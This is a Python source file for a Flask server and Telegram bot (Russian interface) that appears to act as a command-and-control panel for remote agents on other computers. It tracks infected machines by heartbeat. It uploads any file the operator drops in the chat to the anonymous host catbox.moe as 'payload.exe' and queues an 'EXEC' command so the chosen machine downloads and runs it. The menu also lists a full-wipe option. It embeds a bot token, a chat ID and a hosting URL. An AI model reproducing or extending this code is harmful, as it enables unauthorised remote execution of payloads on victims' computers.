import os
import time
import requests
import telebot
from flask import Flask, request, jsonify

TOKEN = "9213726416:AAHSKz3sdyxo05XS-yX0dH_1h6FGg7PKA_k"
bot = telebot.TeleBot(TOKEN, threaded=False)

app = Flask(__name__)

active_computers = {}
pending_commands = {}
selected_computer = None

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_data = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_data)
        bot.process_new_updates([update])
        return "", 200
    return "Forbidden", 403

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json
    if data and "pc" in data:
        pc_name = data["pc"]
        active_computers[pc_name] = time.time()
    return jsonify({"status": "ok"}), 200

@app.route("/api/get_command", methods=["GET"])
def get_command():
    pc_name = request.args.get("pc", "")
    cmd = pending_commands.get(pc_name, "")
    if pc_name in pending_commands:
        pending_commands[pc_name] = ""
    return jsonify({"command": cmd}), 200

@app.route("/api/report", methods=["POST"])
def report():
    data = request.json
    if data and "message" in data:
        chat_id = "8172067310"
        bot.send_message(chat_id, f"Отчет от ПК [{data.get('pc', 'Unknown')}]:\n{data['message']}")
    return "OK", 200

@app.route("/", methods=["GET"])
def index():
    return "Server is running", 200

@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("Список компьютеров", "Запустить файл")
    markup.row("Полный Wipe")
    bot.send_message(message.chat.id, "Панель управления активна. Можешь просто перетащить и скинуть файл в чат.", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == "Список компьютеров")
def list_computers(message):
    global active_computers
    current_time = time.time()
    offline_pcs = [pc for pc, t in active_computers.items() if current_time - t > 30]
    for pc in offline_pcs:
        del active_computers[pc]

    if not active_computers:
        bot.send_message(message.chat.id, "Нет активных компьютеров в сети.")
        return

    markup = telebot.types.InlineKeyboardMarkup()
    for pc_name in active_computers.keys():
        markup.add(telebot.types.InlineKeyboardButton(f"ПК: {pc_name} [В сети]", callback_data=f"select_pc:{pc_name}"))
    markup.add(telebot.types.InlineKeyboardButton("Назад", callback_data="menu_main"))
    bot.send_message(message.chat.id, "Активные компьютеры:", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text == "Запустить файл")
def ask_file_path(message):
    global selected_computer
    if not selected_computer:
        bot.send_message(message.chat.id, "Сначала выберите компьютер в разделе 'Список компьютеров'.")
        return
    bot.send_message(message.chat.id, f"Просто скинь файл (.exe или любой другой) в этот чат, и он автоматически запустится на ПК {selected_computer}.")

# Перехват любых файлов и документов, которые ты кидаешь в чат
@bot.message_handler(content_types=['document', 'audio', 'video', 'photo'])
def handle_uploaded_file(message):
    global selected_computer, pending_commands
    if not selected_computer:
        bot.send_message(message.chat.id, "Сначала выберите компьютер через 'Список компьютеров'.")
        return

    try:
        bot.send_message(message.chat.id, "Получил файл, загружаю на сервер для передачи агенту...")
        
        # Получаем файл от Telegram
        file_info = None
        if message.document:
            file_info = bot.get_file(message.document.file_id)
        elif message.photo:
            file_info = bot.get_file(message.photo[-1].file_id)
        elif message.video:
            file_info = bot.get_file(message.video.file_id)
        elif message.audio:
            file_info = bot.get_file(message.audio.file_id)

        if not file_info:
            bot.send_message(message.chat.id, "Не удалось обработать файл.")
            return

        downloaded_file = bot.download_file(file_info.file_path)

        # Загружаем файл на публичный анонимный файлообменник (catbox.moe), чтобы агент мог скачать его по прямой ссылке
        files = {'fileToUpload': ('payload.exe', downloaded_file)}
        data = {'reqtype': 'fileupload'}
        response = requests.post('https://catbox.moe/user/api.php', data=data, files=files)

        if response.status_code == 200 and response.text.startswith('http'):
            direct_url = response.text.strip()
            # Отправляем команду агенту
            pending_commands[selected_computer] = f"EXEC:{direct_url}"
            bot.send_message(message.chat.id, f"Файл успешно отправлен на ПК {selected_computer} и запущен.")
        else:
            bot.send_message(message.chat.id, "Ошибка загрузки файла на хостинг.")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def callbacks(call):
    global selected_computer
    data = call.data
    
    if data.startswith("select_pc:"):
        selected_computer = data.split(":")[1]
        bot.answer_callback_query(call.id, f"Выбран ПК: {selected_computer}")
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"Активный компьютер: {selected_computer}")
    elif data == "menu_main":
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Главное меню.")

if __name__ == "__main__":
    HOST_URL = "https://tg-bot-bekv.onrender.com"
    bot.remove_webhook()
    bot.set_webhook(url=f"{HOST_URL}/{TOKEN}")
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
